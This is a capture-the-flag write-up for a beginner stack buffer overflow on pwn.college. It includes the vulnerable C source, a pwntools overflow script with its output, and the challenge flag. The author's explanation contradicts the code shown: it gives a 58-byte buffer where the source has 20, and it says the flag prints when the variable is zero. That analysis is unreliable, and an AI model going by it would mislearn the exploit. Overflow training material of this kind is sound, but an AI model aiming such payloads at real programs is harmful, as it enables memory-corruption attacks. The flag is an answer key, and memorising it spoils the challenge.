# Binary Exploitation

## Your First Overflow (easy)

### Solve :

**Flag:** `pwn.college{gYHvkn8ypdNIpg7TiOwOu7AnYLc.dlDOywSO5EzNzEzW}`


```
hacker@binary-exploitation~your-first-overflow-easy:/challenge$ cat DESCRIPTION.md
Overflow a buffer on the stack to set the right conditions to obtain the flag!
```
Opening the `.c` file for the challenge, i got
```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

uint64_t sp_;
uint64_t bp_;
uint64_t sz_;
uint64_t cp_;
uint64_t cv_;
uint64_t si_;
uint64_t rp_;

#define GET_SP(sp) asm volatile ("mov %0, rsp" : "=r"(sp) : : );
#define GET_BP(bp) asm volatile ("mov %0, rbp" : "=r"(bp) : : );
#define GET_CANARY(cn) asm volatile ("mov %0, QWORD PTR [fs:0x28]" : "=r"(cn) : : );
#define GET_FRAME_WORDS(sz_, sp, bp, rp_) GET_SP(sp); GET_BP(bp); sz_ = (bp-sp)/8+2; rp_ = bp+8;
#define FIND_CANARY(cnp, cv, start)                                     \
  {                                                                     \
    cnp = start;                                                        \
    GET_CANARY(cv);                                                     \
    while (*(uint64_t *)cnp != cv) cnp = (uint64_t)cnp - 8;   \
  }

void DUMP_STACK(uint64_t sp, uint64_t n)
{
    printf("+---------------------------------+-------------------------+--------------------+\n");
    printf("| %31s | %23s | %18s |\n", "Stack location", "Data (bytes)", "Data (LE int)");
    printf("+---------------------------------+-------------------------+--------------------+\n");
    for (si_ = 0; si_ < n; si_++)
    {
        printf("| 0x%016lx (rsp+0x%04x) | %02x %02x %02x %02x %02x %02x %02x %02x | 0x%016lx |\n",
               sp+8*si_, 8*si_,
               *(uint8_t *)(sp+8*si_+0), *(uint8_t *)(sp+8*si_+1), *(uint8_t *)(sp+8*si_+2), *(uint8_t *)(sp+8*si_+3),
               *(uint8_t *)(sp+8*si_+4), *(uint8_t *)(sp+8*si_+5), *(uint8_t *)(sp+8*si_+6), *(uint8_t *)(sp+8*si_+7),
               *(uint64_t *)(sp+8*si_)
              );
    }
    printf("+---------------------------------+-------------------------+--------------------+\n");
}

void bin_padding()
{
    asm volatile (".rept 3461; nop; .endr");
}

void win()
{
    static char flag[256];
    static int flag_fd;
    static int flag_length;

    puts("You win! Here is your flag:");
    flag_fd = open("/flag", 0);
    if (flag_fd < 0)
    {
        printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
        if (geteuid() != 0)
        {
            printf("  Your effective user id is not 0!\n");
            printf("  You must directly run the suid binary in order to have the correct permissions!\n");
        }
        exit(-1);
    }
    flag_length = read(flag_fd, flag, sizeof(flag));
    if (flag_length <= 0)
    {
        printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
        exit(-1);
    }
    write(1, flag, flag_length);
    printf("\n\n");
}

int challenge(int argc, char **argv, char **envp)
{
    struct
    {
        char input[20];
        int win_variable;
    } data  = {0} ;

    unsigned long size = 0;

    puts("The challenge() function has just been launched!");

    GET_FRAME_WORDS(sz_, sp_, bp_, rp_);
    puts("Before we do anything, let's take a look at challenge()'s stack frame:");
    DUMP_STACK(sp_, sz_);
    printf("Our stack pointer points to %p, and our base pointer points to %p.\n", sp_, bp_);
    printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
    printf("including the saved base pointer and the saved return address, for a\n");
    printf("total of %d bytes.\n", sz_ * 8);
    printf("The input buffer begins at %p, partway through the stack frame,\n", &data.input);
    printf("(\"above\" it in the stack are other local variables used by the function).\n");
    printf("Your input will be read into this buffer.\n");
    printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 20);
    printf("large input length, and thus overflow the buffer.\n\n");

    printf("In this level, there is a \"win\" variable.\n");
    printf("By default, the value of this variable is zero.\n");
    printf("However, when this variable is non-zero, the flag will be printed.\n");
    printf("You can make this variable be non-zero by overflowing the input buffer.\n");
    printf("The \"win\" variable is stored at %p, %d bytes after the start of your input buffer.\n\n", &data.win_variable, ((unsigned long) &data.win_variable) - ((unsigned long) &data.input));

    puts("We have disabled the following standard memory corruption mitigations for this challenge:");
    puts("- the binary is *not* position independent. This means that it will be");
    puts("located at the same spot every time it is run, which means that by");
    puts("analyzing the binary (using objdump or reading this output), you can");
    puts("know the exact value that you need to overwrite the return address with.\n");

    FIND_CANARY(cp_, cv_, bp_);

    size = 4096;

    printf("You have chosen to send %lu bytes of input!\n", size);
    printf("This will allow you to write from %p (the start of the input buffer)\n", &data.input);
    printf("right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n", size + (unsigned long) &data.input, size - 20);

    printf("Send your payload (up to %lu bytes)!\n", size);
    int received = read(0, &data.input, (unsigned long) size);

    if (received < 0)
    {
        printf("ERROR: Failed to read input -- %s!\n", strerror(errno));
        exit(1);
    }

    printf("You sent %d bytes!\n", received);

    printf("Let's see what happened with the stack:\n\n");
    DUMP_STACK(sp_, sz_);

    printf("The program's memory status:\n");
    printf("- the input buffer starts at %p\n", &data.input);
    printf("- the saved frame pointer (of main) is at %p\n", bp_);
    printf("- the saved return address (previously to main) is at %p\n", rp_);
    printf("- the saved return address is now pointing to %p.\n", *(unsigned long*)(rp_));
    printf("- the canary is stored at %p.\n", cp_);
    printf("- the canary value is now %p.\n", *(unsigned long*)(cp_));
    printf("- the address of the win variable is %p.\n", &data.win_variable);
    printf("- the value of the win variable is 0x%x.\n", data.win_variable);
    printf("\n");

    if (data.win_variable)
    {
        win();
    }

    puts("Goodbye!");

    return 0;
}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char crash_resistance[0x1000];

    challenge(argc, argv, envp);

}hacker@binary-exploitation~your-first-overflow-easy:/challenge$ 
```
This contains the struct,
```c
struct {
    char input[58];     
    int win_variable;    
} data = {0};
```
Where when win_variable==0, it prints the flag.
Based on this struct, i made this small section
```python
from pwn import *

r = process('./binary-exploitation-first-overflow-w')
r.send(b'A'*60 + p32(1))
print(r.readall())
```
and ran it using `python3 -c "from pwn import *; r = process('./binary-exploitation-first-overflow-w'); r.send(b'A'*60 + p32(1)); print(r.readall())"`

In this snippet, `b'A'*60` overflows the buffer which is of 58 bytes + 2 padding bytes and the `p32(1)` writes win_variable=1 in litle endian format, which is whats followed in this.

I got the flag with this.
```
hacker@binary-exploitation~your-first-overflow-easy:/challenge$ python3 -c "from pwn import *; r = process('./binary-exploitation-first-overflow-w'); r.send(b'A'*60 + p32(1)); print(r.readall())"
[+] Starting local process './binary-exploitation-first-overflow-w': pid 311
[+] Receiving all data: Done (4.85KB)
[*] Process './binary-exploitation-first-overflow-w' stopped with exit code -6 (SIGABRT) (pid 311)
b'The challenge() function has just been launched!\nBefore we do anything, let\'s take a look at challenge()\'s stack frame:\n+---------------------------------+-------------------------+--------------------+\n|                  Stack location |            Data (bytes) |      Data (LE int) |\n+---------------------------------+-------------------------+--------------------+\n| 0x00007fffafe28e40 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fffafe28e48 (rsp+0x0008) | d8 9f e2 af ff 7f 00 00 | 0x00007fffafe29fd8 |\n| 0x00007fffafe28e50 (rsp+0x0010) | c8 9f e2 af ff 7f 00 00 | 0x00007fffafe29fc8 |\n| 0x00007fffafe28e58 (rsp+0x0018) | 3d 65 dc 03 01 00 00 00 | 0x0000000103dc653d |\n| 0x00007fffafe28e60 (rsp+0x0020) | a0 56 f2 03 9d 7c 00 00 | 0x00007c9d03f256a0 |\n| 0x00007fffafe28e68 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fffafe28e70 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fffafe28e78 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fffafe28e80 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fffafe28e88 (rsp+0x0048) | 00 89 4c 09 31 a7 33 ad | 0xad33a731094c8900 |\n| 0x00007fffafe28e90 (rsp+0x0050) | d0 9e e2 af ff 7f 00 00 | 0x00007fffafe29ed0 |\n| 0x00007fffafe28e98 (rsp+0x0058) | 35 28 40 00 00 00 00 00 | 0x0000000000402835 |\n+---------------------------------+-------------------------+--------------------+\nOur stack pointer points to 0x7fffafe28e40, and our base pointer points to 0x7fffafe28e90.\nThis means that we have (decimal) 12 8-byte words in our stack frame,\nincluding the saved base pointer and the saved return address, for a\ntotal of 96 bytes.\nThe input buffer begins at 0x7fffafe28e70, partway through the stack frame,\n("above" it in the stack are other local variables used by the function).\nYour input will be read into this buffer.\nThe buffer is 20 bytes long, but the program will let you provide an arbitrarily\nlarge input length, and thus overflow the buffer.\n\nIn this level, there is a "win" variable.\nBy default, the value of this variable is zero.\nHowever, when this variable is non-zero, the flag will be printed.\nYou can make this variable be non-zero by overflowing the input buffer.\nThe "win" variable is stored at 0x7fffafe28e84, 20 bytes after the start of your input buffer.\n\nWe have disabled the following standard memory corruption mitigations for this challenge:\n- the binary is *not* position independent. This means that it will be\nlocated at the same spot every time it is run, which means that by\nanalyzing the binary (using objdump or reading this output), you can\nknow the exact value that you need to overwrite the return address with.\n\nYou have chosen to send 4096 bytes of input!\nThis will allow you to write from 0x7fffafe28e70 (the start of the input buffer)\nright up to (but not including) 0x7fffafe29e70 (which is 4076 bytes beyond the end of the buffer).\nSend your payload (up to 4096 bytes)!\nYou sent 64 bytes!\nLet\'s see what happened with the stack:\n\n+---------------------------------+-------------------------+--------------------+\n|                  Stack location |            Data (bytes) |      Data (LE int) |\n+---------------------------------+-------------------------+--------------------+\n| 0x00007fffafe28e40 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007fffafe28e48 (rsp+0x0008) | d8 9f e2 af ff 7f 00 00 | 0x00007fffafe29fd8 |\n| 0x00007fffafe28e50 (rsp+0x0010) | c8 9f e2 af ff 7f 00 00 | 0x00007fffafe29fc8 |\n| 0x00007fffafe28e58 (rsp+0x0018) | 3d 65 dc 03 01 00 00 00 | 0x0000000103dc653d |\n| 0x00007fffafe28e60 (rsp+0x0020) | a0 56 f2 03 40 00 00 00 | 0x0000004003f256a0 |\n| 0x00007fffafe28e68 (rsp+0x0028) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |\n| 0x00007fffafe28e70 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fffafe28e78 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fffafe28e80 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fffafe28e88 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fffafe28e90 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007fffafe28e98 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n+---------------------------------+-------------------------+--------------------+\nThe program\'s memory status:\n- the input buffer starts at 0x7fffafe28e70\n- the saved frame pointer (of main) is at 0x7fffafe28e90\n- the saved return address (previously to main) is at 0x7fffafe28e98\n- the saved return address is now pointing to 0x4141414141414141.\n- the canary is stored at 0x7fffafe28e88.\n- the canary value is now 0x4141414141414141.\n- the address of the win variable is 0x7fffafe28e84.\n- the value of the win variable is 0x41414141.\n\nYou win! Here is your flag:\npwn.college{gYHvkn8ypdNIpg7TiOwOu7AnYLc.dlDOywSO5EzNzEzW}\n\n\nGoodbye!\n*** stack smashing detected ***: terminated\n'
hacker@binary-exploitation~your-first-overflow-easy:/challenge$ 

```
